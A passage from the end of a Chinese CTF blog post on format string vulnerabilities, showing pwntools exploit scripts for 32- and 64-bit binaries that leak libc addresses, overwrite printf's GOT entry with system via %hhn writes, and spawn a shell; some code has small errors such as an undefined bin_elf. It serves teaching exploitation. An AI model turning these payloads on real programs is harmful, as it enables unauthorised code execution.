libc_elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;libc base address: 0x%x&#x27;</span> % libc_base)</span><br></pre></td></tr></table></figure>
+
+<p>3、改写got表</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sys_addr = libc_base + libc_elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">printf_got = pwn_base + pwn_elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">low1 = sys_addr &amp; <span class="number">0xff</span></span><br><span class="line">low2 = sys_addr &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span></span><br><span class="line">low3 = sys_addr &gt;&gt; <span class="number">8</span> * <span class="number">2</span> &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;B&#x27;</span> + <span class="string">&#x27;%&#123;&#125;c%20$hhn&#x27;</span>.<span class="built_in">format</span>(low1 - <span class="number">1</span>).encode()</span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c%21$hhn&#x27;</span>.<span class="built_in">format</span>((low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span>).encode()</span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c%22$hhn&#x27;</span>.<span class="built_in">format</span>((low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span>).encode()</span><br><span class="line">payload = payload.ljust(<span class="number">12</span> * <span class="number">3</span> + <span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">payload += p32(printf_got) + p32(printf_got + <span class="number">1</span>) + p32(printf_got + <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>64位同理：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span><br><span class="line">sh = process(<span class="string">&#x27;./fmt2_64&#x27;</span>)</span><br><span class="line">pwn_elf = ELF(<span class="string">&#x27;./fmt2_64&#x27;</span>)</span><br><span class="line">libc_elf = pwn_elf.libc</span><br><span class="line"></span><br><span class="line"># <span class="number">1</span> leak binary and libc base address</span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;$p.%3$p&#x27;</span>.format(<span class="type">int</span>(<span class="number">7</span>+<span class="number">0x150</span>/<span class="number">8</span>))</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">ret = sh.recvuntil(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>, drop=True).split(b<span class="number">&#x27;.&#x27;</span>)</span><br><span class="line">bin_base = <span class="type">int</span>(ret[<span class="number">0</span>], <span class="number">16</span>) - <span class="number">0x11a9</span></span><br><span class="line">libc_base = <span class="type">int</span>(ret[<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x10dfd2</span> </span><br><span class="line">info(<span class="string">&#x27;binary base address: 0x%x&#x27;</span> % bin_base)</span><br><span class="line">info(<span class="string">&#x27;libc base address: 0x%x&#x27;</span> % libc_base)</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span> write</span><br><span class="line">sys_addr = libc_base + libc_elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">printf_addr = bin_base + bin_elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">low1 = sys_addr &amp; <span class="number">0xff</span></span><br><span class="line">low2 = sys_addr &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span></span><br><span class="line">low3 = sys_addr &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%15$hhn&#x27;</span>.format(low1).encode()</span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c%16$hhn&#x27;</span>.format((low2-low1+<span class="number">0x100</span>)%<span class="number">0x100</span>).encode()</span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c%17$hhn&#x27;</span>.format((low3-low2+<span class="number">0x100</span>)%<span class="number">0x100</span>).encode()</span><br><span class="line">payload = payload.ljust(<span class="number">12</span> * <span class="number">3</span> + <span class="number">4</span>, b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">payload += p64(printf_addr) + p64(printf_addr+<span class="number">1</span>) + p64(printf_addr+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(b<span class="number">&#x27;</span>/bin/sh\<span class="number">0&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Stribik</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/01/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%86%8D%E8%AE%A4%E8%AF%86/">http://example.com/2024/01/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%86%8D%E8%AE%A4%E8%AF%86/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Find the way to...</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" title="强网2023 pwn-ez_fmt"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">强网2023 pwn-ez_fmt</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" title="强网2023 pwn-ez_fmt"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-14</div><div class="title">强网2023 pwn-ez_fmt</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Stribik</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%8E%9F%E7%90%86%E7%AE%80%E4%BB%8B%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">一、原理简介：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">二、漏洞利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE"><span class="toc-number">2.1.</span> <span class="toc-text">1、泄露数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%9C%B0%E5%9D%80%E6%94%B9%E5%86%99%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">2、地址改写：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%BB%BC%E5%90%88%E6%80%A7%E4%BD%BF%E7%94%A8%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">三、综合性使用：</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%86%8D%E8%AE%A4%E8%AF%86/" title="格式化字符串的再认识">格式化字符串的再认识</a><time datetime="2024-01-25T04:42:02.000Z" title="发表于 2024-01-25 12:42:02">2024-01-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" title="强网2023 pwn-ez_fmt">强网2023 pwn-ez_fmt</a><time datetime="2024-01-14T06:07:59.000Z" title="发表于 2024-01-14 14:07:59">2024-01-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/12/21/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B8%B8%E8%A7%81%E4%BB%A3%E7%A0%81%E6%B1%87%E6%80%BB/" title="二叉树的常见代码汇总">二叉树的常见代码汇总</a><time datetime="2023-12-21T09:05:19.000Z" title="发表于 2023-12-21 17:05:19">2023-12-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/12/18/hello-world/" title="Hello World">Hello World</a><time datetime="2023-12-17T16:00:03.498Z" title="发表于 2023-12-18 00:00:03">2023-12-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Stribik</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
